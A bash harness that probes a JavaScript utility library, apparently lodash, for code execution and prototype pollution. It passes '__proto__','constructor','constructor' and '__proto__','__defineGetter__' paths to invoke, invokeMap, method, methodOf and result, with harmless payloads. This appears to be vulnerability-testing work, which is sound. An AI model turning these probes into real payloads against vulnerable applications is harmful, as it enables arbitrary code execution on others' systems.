#!/bin/bash
L="$1"; V=$(basename $(dirname "$L"))
run() {
  local name="$1"; local code="$2"
  node -e "
const _=require('$L');
let out=null,err=null;
try{ out = $code }catch(e){ err=e.constructor.name+': '+e.message; }
console.log(JSON.stringify({t:'$name',ver:_.VERSION,result:typeof out==='function'?'<function>':String(out),err:err}));
" 2>&1
}
run invoke_exec        "_.invoke({}, ['__proto__','constructor','constructor'], 'return process.version')"
run invokeMap_exec     "_.invokeMap([{},{}], ['__proto__','constructor','constructor'], 'return process.version')"
run method_exec        "_.method(['__proto__','constructor','constructor'], 'return process.version')({})()"
run methodOf_exec      "_.methodOf({}, ['__proto__','constructor','constructor'], 'return process.version')()"
run invoke_getter      "_.invoke({}, ['__proto__','__defineGetter__'], 'pwn', function(){return 1})"
run invokeMap_getter   "_.invokeMap([{}], ['__proto__','__defineGetter__'], 'pwn', function(){return 1})"
run method_getter      "_.method(['__proto__','__defineGetter__'], 'pwn', function(){return 1})({})"
run methodOf_getter    "_.methodOf({}, ['__proto__','__defineGetter__'], 'pwn', function(){return 1})()"
run result_ctor        "_.result({}, ['__proto__','constructor','constructor'])"
run result_getter      "_.result({}, ['__proto__','__defineGetter__'])"
